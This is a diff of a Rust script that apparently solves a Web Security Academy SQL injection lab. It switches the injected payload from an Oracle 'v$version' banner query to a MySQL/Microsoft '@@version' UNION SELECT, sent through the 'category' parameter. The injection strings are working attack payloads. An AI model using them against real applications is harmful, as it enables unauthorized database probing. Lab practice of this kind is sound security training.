@@ -1,15 +1,16 @@
-/*******************************************************************************
+/******************************************************************************
 *
 * Author: Ahmed Elqalawii
 *
-* Date: 15/9/2023
+* Date: 16/9/2023
 *
-* Lab: SQL injection attack, querying the database type and version on Oracle
+* Lab: SQL injection attack, querying the database type and version on MySQL 
+*      and Microsoft
 *
 * Steps: 1. Inject payload in 'category' query parameter
-*        2. Retrieve database banner in the response
+*        2. Retrieve database version in the response
 *
-********************************************************************************/
+*******************************************************************************/
 #![allow(unused)]
 /***********
 * Imports
@@ -31,7 +32,7 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0a0a0041033073c5810ea2a600b4006c.web-security-academy.net";
+    let url = "https://0a9e00dc0409a8fd8230b67f009f00c4.web-security-academy.net";
     // build the client used in all subsequent requests
     let client = build_client();
 
@@ -41,10 +42,10 @@ fn main() {
     );
     io::stdout().flush();
     // the payload to inject in the query parameter
-    let payload = "' UNION SELECT banner, null FROM v$version-- -";
+    let payload = "' UNION SELECT @@version, null-- -";
     // fetch the page with the injected payload
     let inject = client
-        .get(format!("{url}/filter?category=Gifts{payload}"))
+        .get(format!("{url}/filter?category={payload}"))
         .send()
         .expect(&format!(
             "{}",
@@ -53,7 +54,7 @@ fn main() {
     println!("{}", "OK".green());
     println!(
         "{} {}",
-        "2. Retrieving database banner in the response..".white(),
+        "2. Retrieving database version in the response..".white(),
         "OK".green()
     );
     println!(
